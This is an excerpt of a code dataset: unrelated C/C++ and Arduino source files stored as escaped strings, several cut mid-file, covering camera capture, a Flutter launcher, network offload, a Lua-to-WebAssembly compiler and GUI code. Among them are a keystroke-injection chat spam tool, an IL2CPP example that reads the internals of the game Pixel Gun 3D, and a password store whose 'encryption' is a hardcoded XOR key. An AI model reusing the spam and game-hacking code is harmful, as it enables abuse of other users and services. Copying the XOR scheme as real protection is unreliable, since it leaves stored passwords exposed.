\u786e\u4fdd\u5728\u5b50\u7ebf\u7a0b\u4e2d\u91ca\u653e\u8d44\u6e90\n}\n\nstd::deque<cv::Mat> frameQueue; // \u53cc\u7aef\u961f\u5217\u7528\u4e8e\u5b58\u50a8\u5e27\nstd::mutex queueMutex; // \u4fdd\u62a4\u961f\u5217\u7684\u4e92\u65a5\u9501\nbool stopCapture = false; // \u6807\u8bb0\u662f\u5426\u505c\u6b62\u6355\u83b7\n#define MAX_QUEUE_SIZE 10\n\n// \u4fee\u6539\u540e\u7684\u5e27\u8bfb\u53d6\u51fd\u6570\nvoid captureFrames_queue(cv::VideoCapture &cap) {\n    while (!stopCapture) {\n        {\n            // ScopeTimer timer(\"captureFrames_queue\");\n            cv::Mat frame;\n            if (!cap.read(frame)) {\n                std::cerr << \"read frame failed!\" << std::endl;\n                break;\n            }\n\n            // \u52a0\u9501\uff0c\u5c06\u5e27\u6dfb\u52a0\u5230\u961f\u5217\u4e2d\uff0c\u7136\u540e\u7acb\u5373\u89e3\u9501\n            {\n                std::lock_guard<std::mutex> lock(queueMutex);\n                frameQueue.push_back(frame.clone()); // \u4f7f\u7528clone\u907f\u514d\u610f\u5916\u7684\u5185\u5b58\u7ba1\u7406\u95ee\u9898\n                // std::cout << \"Frame queue size: \" << frameQueue.size() << std::endl;\n                // \u5982\u679c\u961f\u5217\u592a\u957f\uff0c\u8003\u8651\u79fb\u9664\u6700\u65e9\u7684\u5e27\u4ee5\u907f\u514d\u65e0\u9650\u589e\u957f\n                if (frameQueue.size() > MAX_QUEUE_SIZE) {\n                    frameQueue.pop_front();\n                    std::cout << \"Frame queue size exceeds limit, removing oldest frame.\" << std::endl;\n                }\n            }\n        }\n\n\n    }\n    cap.release();\n}\n\n\nint start() {\n    // \u91ca\u653eGIL\uff0c\u907f\u514dPython\u4ee3\u7801\u963b\u585e\n    py::gil_scoped_release release;\n\n\n    // \u521d\u59cb\u5316\u89c6\u9891\u6355\u83b7\u5bf9\u8c61\uff0c0\u4ee3\u8868\u9ed8\u8ba4\u6444\u50cf\u5934\uff0c\u5982\u679c\u6709\u591a\u4e2a\u6444\u50cf\u5934\uff0c\u53ef\u4ee5\u5c1d\u8bd51, 2, ...\n    cv::VideoCapture cap(0, cv::CAP_DSHOW);\n\n    if (!cap.isOpened()) {\n        std::cerr << \"can't open camera\uff01\" << std::endl;\n        return -1;\n    }\n\n    // \u8bbe\u7f6e\u89c6\u9891\u7684\u5e27\u7387\u3001\u5bbd\u5ea6\u548c\u9ad8\u5ea6\n    int fps = 30;\n    int width = 1920;\n    int height = 1080;\n//    int fps = 60;\n//    int width = 640;\n//    int height = 480;\n    cap.set(cv::CAP_PROP_FPS, fps);\n    cap.set(cv::CAP_PROP_FRAME_WIDTH, width);\n    cap.set(cv::CAP_PROP_FRAME_HEIGHT, height);\n    // \u8bbe\u7f6e\u89c6\u9891\u7684\u7f16\u7801\u683c\u5f0f\n    cap.set(cv::CAP_PROP_FOURCC, cv::VideoWriter::fourcc('M', 'J', 'P', 'G'));\n\n    // \u83b7\u53d6\u89c6\u9891\u7684\u5e27\u7387\u3001\u5bbd\u5ea6\u548c\u9ad8\u5ea6\u3001\u7f16\u7801\u683c\u5f0f\n    std::cout << \"fps:\" << cap.get(cv::CAP_PROP_FPS) << std::endl;\n    std::cout << \"width:\" << cap.get(cv::CAP_PROP_FRAME_WIDTH) << std::endl;\n    std::cout << \"height:\" << cap.get(cv::CAP_PROP_FRAME_HEIGHT) << std::endl;\n    std::cout << \"fourcc:\" << fourccToString(cap.get(cv::CAP_PROP_FOURCC)) << std::endl;\n\n    // \u521b\u5efa\u4e00\u4e2a\u7a97\u53e3\u7528\u6765\u663e\u793a\u89c6\u9891\n    cv::namedWindow(\"capture\", cv::WINDOW_NORMAL);\n    cv::resizeWindow(\"capture\", static_cast<int>(width), static_cast<int>(height));\n\n\n    // \u542f\u52a8\u5b50\u7ebf\u7a0b\u8fdb\u884c\u5e27\u6355\u6349\n    // std::thread captureThread(captureFrames, std::ref(cap));\n    std::thread captureThread(captureFrames_queue, std::ref(cap));\n\n    while (true) {\n\n        ScopeTimer timer(\"capture\");\n        cv::Mat currentFrame;\n\n        // \u52a0\u9501\uff0c\u68c0\u67e5\u5e76\u83b7\u53d6\u6700\u65b0\u5e27\uff0c\u89e3\u9501\n        {\n\n            std::lock_guard<std::mutex> lock(queueMutex);\n            if (!frameQueue.empty()) {\n                currentFrame = frameQueue.front();\n                frameQueue.pop_front(); // \u8fd9\u5c06\u5220\u9664\u961f\u5217\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\n            } else {\n                // std::cout << \"Frame queue is empty, waiting for new frames.\" << std::endl;\n                continue; // \u5982\u679c\u961f\u5217\u4e3a\u7a7a\uff0c\u76f4\u63a5\u8df3\u8fc7\u672c\u6b21\u5faa\u73af\n            }\n        }\n\n        if (!currentFrame.empty()) {\n\n            cv::imshow(\"capture\", currentFrame);\n        }\n\n        int key = cv:",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"lgsy_image\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\nCopyright (c) 2017-2018, The Linux Foundation. All rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are\nmet:\n* Redistributions of source code must retain the above copyright\n  notice, this list of conditions and the following disclaimer.\n* Redistributions in binary form must reproduce the above\n  copyright notice, this list of conditions and the following\n  disclaimer in the documentation and/or other materials provided\n  with the distribution.\n* Neither the name of The Linux Foundation nor the names of its\n  contributors may be used to endorse or promote products derived\n  from this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\nWARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\nMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\nARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\nBE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\nCONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\nSUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\nBUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\nWHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\nOR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\nIF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.Z\n*/\n/*!\n  @file\n  IPACM_OffloadManager.cpp\n\n  @brief\n  This file implements the basis Iface functionality.\n\n  @Author\n  Skylar Chang\n\n*/\n#include <IPACM_OffloadManager.h>\n#include <sys/ioctl.h>\n#include <net/if.h>\n#include <string.h>\n#include \"IPACM_ConntrackClient.h\"\n#include \"IPACM_ConntrackListener.h\"\n#include \"IPACM_Iface.h\"\n#include \"IPACM_Config.h\"\n#include <unistd.h>\n\nconst char *IPACM_OffloadManager::DEVICE_NAME = \"/dev/wwan_ioctl\";\n\n/* NatApp class Implementation */\nIPACM_OffloadManager *IPACM_OffloadManager::pInstance = NULL;\n\nIPACM_OffloadManager::IPACM_OffloadManager()\n{\n\tdefault_gw_index = INVALID_IFACE;\n\tupstream_v4_up = false;\n\tupstream_v6_up = false;\n\tmemset(event_cache, 0, MAX_EVENT_CACHE*sizeof(framework_event_cache));\n\tlatest_cache_index = 0;\n\telrInstance = NULL;\n\ttouInstance = NULL;\n\treturn ;\n}\n\nRET IPACM_OffloadManager::registerEventListener(IpaEventListener* eventlistener)\n{\n\tRET result = SUCCESS;\n\tif (elrInstance == NULL) {\n\t\tIPACMDBG_H(\"get registerEventListener \\n\");\n\t\telrInstance = eventlistener;\n\t} else {\n\t\tIPACMDBG_H(\"already have EventListener previously, override \\n\");\n\t\telrInstance = eventlistener;\n\t\tresult = FAIL_INPUT_CHECK;\n\t}\n\treturn SUCCESS;\n}\n\nRET IPACM_OffloadManager::unregisterEventListener(IpaEventListener* )\n{\n\tRET result = SUCCESS;\n\tif (elrInstance)\n\t\telrInstance = NULL;\n\telse {\n\t\tIPACMDBG_H(\"already unregisterEventListener previously \\n\");\n\t\tresult = SUCCESS_DUPLICATE_CONFIG;\n\t}\n\treturn SUCCESS;\n}\n\nRET IPACM_OffloadManager::registerCtTimeoutUpdater(ConntrackTimeoutUpdater* timeoutupdater)\n{\n\tRET result = SUCCESS;\n\tif (touInstance == NULL)\n\t{\n\t\tIPACMDBG_H(\"get ConntrackTimeoutUpdater \\n\");\n\t\ttouInstance = timeoutupdater;\n\t} else {\n\t\tIPACMDBG_H(\"already have ConntrackTimeoutUpdater previously, override \\n\");\n\t\ttouInstance = timeoutupdater;\n\t\tresult = FAIL_INPUT_CHECK;\n\t}\n\treturn SUCCESS;\n}\n\nRET IPACM_OffloadManager::unregisterCtTimeoutUpdater(ConntrackTimeoutUpdater* )\n{\n\tRET result = SUCCESS;\n\tif (touInstance)\n\t\ttouInstance = NULL;\n\telse {\n\t\tIPACMDBG_H(\"already unregisterCtTimeoutUpdater previously \\n\");\n\t\tresult = SUCCESS_DUPLICATE_CONFIG;\n\t}\n\treturn SUCCESS;\n}\n\nRET IPACM_OffloadManager::provideFd(int fd, unsigned int groups)\n{\n\tIPACM_ConntrackClient *cc;\n\tint on = 1, rel;\n\tstruct sockaddr_nl\tlocal;\n\tunsigned int addr_len;\n\n\tcc = IPACM_ConntrackClient::GetInstance();\n\n\tif(!cc)\n\t{\n\t\tIPACMERR(\"Init failed: cc %p\\n\", cc);\n\t\treturn FAIL_HARDWARE;\n\t}\n\n\t/* check socket name */\n\tmemset(&local, 0, sizeof(struct sockaddr_nl));\n\taddr_len = sizeof(local);\n\tgetsockname(fd, (struct sockaddr *)&local, &addr_len);\n\tIPACMDBG_H(\" FD %d, nl_pad %d nl_pid %u\\n\", fd, local.nl_pad, local.nl_pid);\n\n\t/* add the check if getting FDs already or not */\n\tif(cc->fd_tcp > -1 && cc->fd_udp > -1) {\n\t\tIPACMDBG_H(\"has valid FDs fd_tcp %d, fd_udp %d, ignore fd %d.\\n\", cc->fd_tcp, cc->fd_udp, fd);\n\t\treturn SUCCESS;\n\t}\n\n\tif (groups == cc->subscrips_tcp) {\n\t\tcc->fd_tcp = dup(fd);\n\t\tIPACMDBG_H(\"Received fd %d with groups %d.\\n\", fd, groups);\n\t\t/* set netlink buf */\n\t\trel = setsockopt(cc->fd_tcp, SOL_NETLINK, NETLINK_NO_ENOBUFS, &on, sizeof(int) );\n\t\tif (rel == -1)\n\t\t{\n\t\t\tIPACMERR( \"setsockopt returned error code %d ( %s )\", errno, strerror( errno ) );\n\t\t}\n\t} else if (groups == cc->subscrips_udp) {\n\t\tcc->fd_udp = dup(fd);\n\t\tIPACMDBG_H(\"Received fd %d with groups %d.\\n\", fd, groups);\n\t\t/* set netlink buf */\n\t\trel = setsockopt(cc->fd_tcp, SOL_NETLINK, NETLINK_NO_ENOBUFS, &on, sizeof(int) );\n\t\tif (rel == -1)\n\t\t{\n\t\t\tIPACMERR( \"setsockopt returned error c",
    "#include \"../BNM-IL2CPP/BNM.hpp\"\n#include <cstdint>\n#include <string>\n\n// This examples work in Pixel Gun 3D v24.6.0\n\nint main()\n{\n\n    // dont forgot about initialize\n    IL2CPP::Initialize();\n    /*\n    Getting assemblies and images of assemblies\n    */\n\n    IL2CPP::Assembly *__AssemblyCSharp = IL2CPP::Domain()->Assembly(\"Assembly-CSharp\");\n    IL2CPP::Image *AssemblyCSharp = __AssemblyCSharp->Image();\n\n    IL2CPP::Assembly *__mscorlib = IL2CPP::Domain()->Assembly(\"mscorlib\");\n    IL2CPP::Image *mscorlib = __mscorlib->Image();\n\n    /*\n    Getting classes\n    */\n\n    IL2CPP::Class *Klass_1 = AssemblyCSharp->Class(\"\u4e1c\u4e1e\u4e1d\u4e1e\u4e07\u4e12\u4e1b\u4e02\u4e10\");\n    IL2CPP::Class *Vector3_Klass = mscorlib->Class(\"UnityEngine.Vector3\"); // namespace + name\n\n    const char *Vector3_Klass_name = Vector3_Klass->Name(); // Vector3\n\n    /*\n    Creating instaces of classes\n    */\n\n    IL2CPP::Object *Vector3_Instance = IL2CPP::Object::New(Vector3_Klass);\n\n    /*\n    Getting and reading fields\n    at the moment i didn't make settings fields but it ezzzz and i'll make it a little later\n    */\n\n    // Getting non-static field\n    IL2CPP::Field *Vector3_X = Vector3_Instance->Field(\"x\");\n\n    // if field non-static, we need to pass instance to parameters\n    int Vector3_X_Value = Vector3_X.GetValue<int>(Vector3_Instance); // 0 by default.\n\n    // Getting static field\n    IL2CPP::Field *Static_Field = Klass_1->Field(\"\u4e03\u4e1e\u4e0c\u4e17\u4e13\u4e15\u4e15\u4e1a\u4e0b\");\n    int Static_Field_Value = Static_Field->GetValue<int>(); // 150\n    /*\n    if field is class instance just cast it to void* and use IL2CPP::Object() constructor\n    */\n\n    /*\n    Getting info of methods\n    */\n\n    IL2CPP::Method *PixelTime_Update = AssemblyCSharp->Class(\"PixelTime\")->Method(\"Update\");\n    uint64_t PixelTime_Update_VA = PixelTime_Update->VA();   // Value address\n    uint64_t PixelTime_Update_RVA = PixelTime_Update->RVA(); // Relative value address (offset)\n    const char *PixelTime_Update_Name = PixelTime_Update.Name();\n\n    /*\n    Strings\n    */\n    IL2CPP::String *String1 = IL2CPP::String::New(\"example\");\n    std::string String1_Content = String1->Content(); // also you can set content by SetContent() method\n    int String1_Length = String1->Length();\n    // if you want to string into parameter use String.Address()\n\n    /*\n    Arrays.\n    For example i'll use array with classes (string)\n    */\n    IL2CPP::Array *String_Array = IL2CPP::Array::New(mscorlib.Class(\"System.String\"), 3);\n    void *String_Array_Elements = String_Array->Elements();                    // pointer to C-array of elements\n    String_Array->Set(0, String1);                                             // set value\n    IL2CPP::String String2 = (IL2CPP::String *)(String_Array->Get<void *>(0)); // getting string value\n    int String_Array_Length = String_Array->Length();\n\n    /*\n    Nested classes\n    */\n    IL2CPP::Class *Nested_Klass = AssemblyCSharp->Class(\"Progress.\u4e02\u4e0f\u4e02\u4e1b\u4e1b\u4e1a\u4e10\u4e1c\u4e0e\")->Nested(\"\u4e1e\u4e01\u4e1a\u4e04\u4e18\u4e1c\u4e0e\u4e05\u4e0d\");\n    const char *Nested_Klass_Name = Nested_Klass->Name(); // \u4e1e\u4e01\u4e1a\u4e04\u4e18\u4e1c\u4e0e\u4e05\u4e0d\n}\n",
    "#include <iostream>\n#include <string>\n#include <Windows.h>\n\nbool final = false;\n\nvoid escribir(const std::string& text) {\n    for (char c : text) {\n        INPUT input[2];\n        input[0].type = INPUT_KEYBOARD;\n        input[0].ki.wVk = 0;\n        input[0].ki.wScan = c;\n        input[0].ki.dwFlags = KEYEVENTF_UNICODE;\n        input[0].ki.time = 0;\n        input[0].ki.dwExtraInfo = 0;\n\n        input[1] = input[0];\n        input[1].ki.dwFlags |= KEYEVENTF_KEYUP;\n\n        SendInput(2, input, sizeof(INPUT));\n        Sleep(10);\n    }\n    final = true;\n}\n\nvoid Enter() {\n    keybd_event(VK_RETURN, 0, 0, 0);\n}\n\nvoid soltar_enter() {\n    keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);\n}\n\nvoid flood(const std::string& texto, int cantidadVeces) {\n    for (int i = 0; i < cantidadVeces; ++i) {\n        Sleep(1);\n        \n        escribir(texto + \"\\n\");\n        Enter();\n        soltar_enter();\n\n        Sleep(50);\n    }\n    Sleep(3000);\n}\n\nint main() {\n    SetConsoleTitle(\"Text Flooder\");\n    std::string logo = R\"(\n _______               __        _______ __                 __             \n|_     _|.-----.--.--.|  |_     |    ___|  |.-----.-----.--|  |.-----.----.\n  |   |  |  -__|_   _||   _|    |    ___|  ||  _  |  _  |  _  ||  -__|   _|\n  |___|  |_____|__.__||____|    |___|   |__||_____|_____|_____||_____|__|  \n    )\";\n\n    std::cout << logo << std::endl;\n\n    std::cout << \"Ingresa el texto que quieres escribir: \";\n    std::string texto;\n    getline(std::cin, texto);\n\n    std::cout << \"Ingresa la cantidad de veces que deseas escribir el texto: \";\n    int cantidadVeces;\n    std::cin >> cantidadVeces;\n\n    std::cout << \"\\nPresiona la tecla SHIFT para iniciar el spam.\\n\";\n\n    while (1) {\n        if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {\n            std::cout << \"\\n\\nIniciando spam en 5 segundos...\\n\\n\";\n            \n            Sleep(5000);\n            flood(texto, cantidadVeces);\n\n            while (!final) {\n                Sleep(1000);\n            }\n            \n            std::cout << \"Spam terminado.\" << std::endl;\n            Sleep(2000);\n            return 0;\n        }\n    }\n\n    return 0;\n}\n",
    "#include \"lua2wasm.hpp\"\n\n#include <stack>\n#include <unordered_map>\n\n#include \"util.hpp\"\n\n#include \"binaryen-c.h\"\n\nnamespace lua2wasm\n{\nusing namespace ast;\nusing namespace wasm;\n\nenum class value_types\n{\n    nil,\n    boolean,\n    integer,\n    number,\n    string,\n    function,\n    userdata,\n    thread,\n    table,\n    dynamic,\n};\n\nstatic value_types get_return_type(const expression& p)\n{\n    return std::visit(overload{\n                          [](const nil&)\n                          {\n                              return value_types::nil;\n                          },\n                          [](const boolean& p)\n                          {\n                              return value_types::boolean;\n                          },\n                          [](const int_type& p)\n                          {\n                              return value_types::integer;\n                          },\n                          [](const float_type& p)\n                          {\n                              return value_types::number;\n                          },\n                          [](const literal& p)\n                          {\n                              return value_types::string;\n                          },\n                          [](const ellipsis& p)\n                          {\n                              return value_types::dynamic;\n                          },\n                          [](const function_body& p)\n                          {\n                              return value_types::function;\n                          },\n                          [](const table_constructor& p)\n                          {\n                              return value_types::table;\n                          },\n                          [](const box<bin_operation>& p)\n                          {\n                              auto lhs = get_return_type(p->lhs);\n                              auto rhs = get_return_type(p->rhs);\n                              if (lhs == value_types::integer && rhs == value_types::integer)\n                              {\n                                  switch (p->op)\n                                  {\n                                  case bin_operator::addition:\n                                      break;\n                                  case bin_operator::subtraction:\n                                      break;\n                                  case bin_operator::multiplication:\n                                      break;\n                                  case bin_operator::division:\n                                      break;\n                                  default:\n                                      break;\n                                  }\n                                  return value_types::integer;\n                              }\n\n                              if (lhs == value_types::number && rhs == value_types::number)\n                              {\n                                  switch (p->op)\n                                  {\n                                  case bin_operator::addition:\n                                      break;\n                                  case bin_operator::subtraction:\n                                      break;\n                                  case bin_operator::multiplication:\n                                      break;\n                                  case bin_operator::division:\n                                      break;\n                                  default:\n                                      break;\n                                  }\n\n                                  return value_types::number;\n                              }\n                              else\n                              {\n                                  if (lhs == value_types::integer && rhs == value_types::number)\n                                  {\n                                      return value_types::number;\n                                  }\n                                  if (lhs == value_types::number && rhs == value_types::integer)\n                                  {\n                                      return value_types::number;\n                                  }\n                              }\n\n                              return value_types::dynamic;\n                          },\n                          [](const box<un_operation>& p)\n                          {\n                              auto rhs = get_return_type(p->rhs);\n\n                              switch (p->op)\n                              {\n                              case un_operator::minus:\n                                  if (rhs == value_types::number)\n                                      return value_types::number;\n                                  else if (rhs == value_types::integer)\n                                      return value_types::integer;\n                                  break;\n                              case un_operator::logic_",
    "#include \"ArduTFLite.h\"\n\ntflite::AllOpsResolver tflOpsResolver;\nconst tflite::Model* tflModel = nullptr;\ntflite::MicroInterpreter* tflInterpreter = nullptr;\nTfLiteTensor* tflInputTensor = nullptr;\nTfLiteTensor* tflOutputTensor = nullptr;\n\n\nbool modelInit(const unsigned char* model, byte* tensorArena, int tensorArenaSize){\n  tflModel = tflite::GetModel(model);\n  if (tflModel->version() != TFLITE_SCHEMA_VERSION) {\n    Serial.println(\"Model schema version mismatch!\");\n    return false;\n  }\n  tflInterpreter = new tflite::MicroInterpreter(tflModel, tflOpsResolver, tensorArena, tensorArenaSize);\n  tflInterpreter->AllocateTensors();\n  tflInputTensor = tflInterpreter->input(0);\n  tflOutputTensor = tflInterpreter->output(0);\n  return true;\n}\n\nbool modelSetInput(float inputValue, int index){\n    if (tflInputTensor == nullptr || index >= tflInputTensor->bytes / sizeof(float)) {\n        Serial.println(\"Input tensor index out of range!\");\n        return false;\n    }\n    tflInputTensor->data.f[index] = inputValue;\n\n    return true;\n}\n\nbool modelRunInference(){\n    TfLiteStatus invokeStatus = tflInterpreter->Invoke();\n        if (invokeStatus != kTfLiteOk) {\n          return false;\n        }\n    return true;\n}\n\nfloat modelGetOutput(int index) {\n    if (tflOutputTensor == nullptr || index >= tflOutputTensor->bytes / sizeof(float)) {\n        Serial.println(\"Output tensor index out of range!\");\n        return -1;\n    }\n\n    return tflOutputTensor->data.f[index];\n}",
    "#include \"..\\includes.hpp\"\n\n#pragma region Base Control\nvoid CControl::SetPosition(int x, int y)\n{\n    m_x = x;\n    m_y = y;\n}\n\nvoid CControl::SetSize(int w, int h)\n{\n    m_iWidth = w;\n    m_iHeight = h;\n}\n\nvoid CControl::GetSize(int &w, int &h)\n{\n    w = m_iWidth;\n    h = m_iHeight;\n}\n\nbool CControl::Flag(int f)\n{\n    if (m_Flags & f)\n        return true;\n    else\n        return false;\n}\n\nPOINT CControl::GetAbsolutePos()\n{\n    POINT p;\n    RECT client = parent->GetClientArea();\n    if (parent)\n    {\n        p.x = m_x + client.left;\n        p.y = m_y + client.top + 29;\n    }\n\n    return p;\n}\n\nvoid CControl::SetFileId(std::string fid)\n{\n    FileIdentifier = fid;\n}\n\nCCheckBox::CCheckBox()\n{\n    // bVar = nullptr;\n    Checked = new bool;\n\n    m_Flags = UIFlags::UI_Clickable | UIFlags::UI_Drawable | UIFlags::UI_SaveFile;\n    m_iWidth = 13;\n    m_iHeight = 13;\n\n    FileControlType = UIControlTypes::UIC_CheckBox;\n}\n\nvoid CCheckBox::SetState(bool s)\n{\n    *Checked = s;\n}\n\nbool CCheckBox::GetState()\n{\n    return *Checked;\n}\n\nvoid CCheckBox::SetVarCb(bool *bVar)\n{\n    if (Checked)\n        delete Checked;\n\n    Checked = bVar;\n}\n\nvoid CCheckBox::Draw(bool hover)\n{\n    POINT tmp = GetAbsolutePos();\n    Vec2 a{float(tmp.x), float(tmp.y)};\n    g_renderer->AddRect(Vec4(a.x, a.y, 13.f, 13.f), D3DCOLOR_RGBA(255, 255, 255, 255));\n\n    if (hover)\n    {\n        if (*Checked)\n        {\n            g_renderer->AddRectFilled(Vec4(a.x + 2, a.y + 2, 9.f, 9.f), D3DCOLOR_XRGB(255, 255, 255));\n        }\n        else\n        {\n            g_renderer->AddRectFilled(Vec4(a.x + 2, a.y + 2, 9.f, 9.f), D3DCOLOR_RGBA(129, 129, 129, 255));\n        }\n        g_renderer->AddRect(Vec4(a.x + 2, a.y + 2, 9.f, 9.f), D3DCOLOR_RGBA(20, 20, 20, 80));\n    }\n    else if (*Checked)\n    {\n        g_renderer->AddRectFilled(Vec4(a.x + 2, a.y + 2, 9.f, 9.f), D3DCOLOR_XRGB(255, 255, 255));\n        g_renderer->AddRect(Vec4(a.x + 2, a.y + 2, 9.f, 9.f), D3DCOLOR_RGBA(20, 20, 20, 80));\n    }\n}\n\nvoid CCheckBox::OnUpdate()\n{\n    m_iWidth = 13;\n    m_iHeight = 13;\n}\n\nvoid CCheckBox::OnClick()\n{\n    *Checked = !*Checked;\n}\n\nCLabel::CLabel()\n{\n    m_Flags = UIFlags::UI_Drawable;\n    Text = \"Default\";\n    FileIdentifier = \"Default\";\n}\n\nvoid CLabel::Draw(bool hover)\n{\n    auto col = D3DCOLOR_RGBA(245, 245, 245, 255);\n\n    if (hover)\n        col = D3DCOLOR_RGBA(205, 205, 205, 255);\n\n    POINT tmp = GetAbsolutePos();\n    Vec2 a{float(tmp.x), float(tmp.y)};\n    g_renderer->AddText(g_fontGUIBold, Text, Vec2(a.x, a.y), col);\n}\n\nvoid CLabel::SetText(std::string text)\n{\n    Text = text;\n}\n\nvoid CLabel::OnUpdate()\n{\n}\nvoid CLabel::OnClick()\n{\n}\n#pragma endregion Implementations of the Label functions\n\n#pragma region GroupBox\nCGroupBox::CGroupBox()\n{\n    Items = 1;\n    m_Flags = UIFlags::UI_Drawable | UIFlags::UI_RenderFirst;\n    Text = \"Default\";\n    FileIdentifier = \"Default\";\n}\n\nvoid CGroupBox::Draw(bool hover)\n{\n    UNREFERENCED_PARAMETER(hover);\n\n    POINT tmp = GetAbsolutePos();\n    Vec2 a{float(tmp.x), float(tmp.y)};\n\n    auto txtSize = g_renderer->CalculateTextExtent(g_fontGUIBold, Text);\n\n    g_renderer->AddRectFilled(Vec4(a.x + 2, a.y + 2, float(m_iWidth - 4), float(m_iHeight - 4)),\n                              D3DCOLOR_RGBA(8, 8, 8, 10)); // menu mini box color\n    g_renderer->AddText(g_fontGUIBold, Text, Vec2(a.x + 15, a.y - (txtSize.y / 2)), D3DCOLOR_RGBA(255, 255, 255, 255));\n\n    g_renderer->AddLine(Vec2(a.x, a.y), Vec2(a.x + 12, a.y), D3DCOLOR_RGBA(129, 129, 129, 255));\n    g_renderer->AddLine(Vec2(a.x + 15 + txtSize.x + 5, a.y), Vec2(a.x + m_iWidth, a.y),\n                        D3DCOLOR_RGBA(129, 129, 129, 255));\n    g_renderer->AddLine(Vec2(a.x, a.y), Vec2(a.x, a.y + m_iHeight), D3DCOLOR_RGBA(129, 129, 129, 255));\n    g_renderer->AddLine(Vec2(a.x, a.y + m_iHeight), Vec2(a.x + m_iWidth, a.y + m_iHeight),\n                        D3DCOLOR_RGBA(129, 129, 129, 255));\n    g_renderer->AddLine(Vec2(a.x + m_iWidth, a.y), Vec2(a.x + m_iWidth, a.y + m_iHeight),\n                        D3DCOLOR_RGBA(129, 129, 129, 255));\n}\n\nvoid CGroupBox::SetText(std::string text)\n{\n    Text = text;\n}\n\nvoid CGroupBox::PlaceLabledControl(std::string Label, CTab *Tab, CControl *control)\n{\n    int x = m_x + 16;\n    int y = m_y + Items * 24;\n\n    CLabel *label = new CLabel;\n    label->SetPosition(x, y);\n    label->SetText(Label);\n    Tab->RegisterControl(label);\n\n    x += m_iWidth / 2;\n\n    int cw, ch;\n    control->SetPosition(x, y);\n    control->GetSize(cw, ch);\n    control->SetSize((m_iWidth / 2) - 32, ch);\n    Tab->RegisterControl(control);\n    Items++;\n}\n\nvoid CGroupBox::OnUpdate()\n{\n}\nvoid CGroupBox::OnClick()\n{\n}\n#pragma endregion Implementations of the Group Box functions\n\n#pragma region Sliders\nCSlider::CSlider()\n{\n    Value = new float;\n    m_Flags = UIFlags::UI_Drawable | UIFlags::UI_Clickable | UIFlags::UI_SaveFile;\n\n    FileControlType = UIControlTypes::UIC_Slider;\n}\n\nvoid CSlider::Draw(bool hover)\n{\n    UNREFERENCED_PARAMETER(hover);\n\n    POINT tmp = GetAbsolutePos();\n    Vec2 ",
    "\r\n#include <Keypad.h>\r\n#include <LiquidCrystal_I2C.h>\r\n#include <EEPROM.h>\r\n\r\n// Keypad setup\r\nconst byte ROWS = 4;\r\nconst byte COLS = 3;\r\nchar keys[ROWS][COLS] = {\r\n  {'1','2','3'},\r\n  {'4','5','6'},\r\n  {'7','8','9'},\r\n  {'*','0','#'}\r\n};\r\nbyte rowPins[ROWS] = {5, 4, 3, 2};\r\nbyte colPins[COLS] = {8, 7, 6};\r\nKeypad keypad = Keypad(makeKeymap(keys), rowPins, colPins, ROWS, COLS);\r\n\r\n// LCD setup\r\nLiquidCrystal_I2C lcd(0x27, 16, 2);\r\n\r\nconst int buttonPin = 9;\r\nconst int ledPin = 10;\r\n\r\nbool mode = false; // false for Retrieve, true for Set\r\nString inputPassword = \"\";\r\nbool verifyCurrentPassword = false; // New flag to indicate current password verification step\r\n\r\n// Encryption key\r\nconst char* encryptionKey = \"simpleKey\";\r\nint keyLength = strlen(encryptionKey);\r\n\r\n// Encrypt or decrypt a character\r\nchar encryptDecrypt(char input, int index) {\r\n  return input ^ encryptionKey[index % keyLength];\r\n}\r\n\r\nvoid setup() {\r\n  pinMode(buttonPin, INPUT_PULLUP);\r\n  pinMode(ledPin, OUTPUT);\r\n  digitalWrite(ledPin, LOW);\r\n\r\n  lcd.init();\r\n  lcd.backlight();\r\n  lcd.clear();\r\n  lcd.print(\"Password manager\");\r\n  delay(2000);\r\n  lcd.clear();\r\n  lcd.print(\"Enter PW- Unlock\");\r\n}\r\n\r\nvoid loop() {\r\n  int currentButtonState = digitalRead(buttonPin);\r\n  static int lastButtonState = HIGH;\r\n\r\n  if (currentButtonState != lastButtonState) {\r\n    if (currentButtonState == LOW) {\r\n      mode = !mode;\r\n      verifyCurrentPassword = mode; // 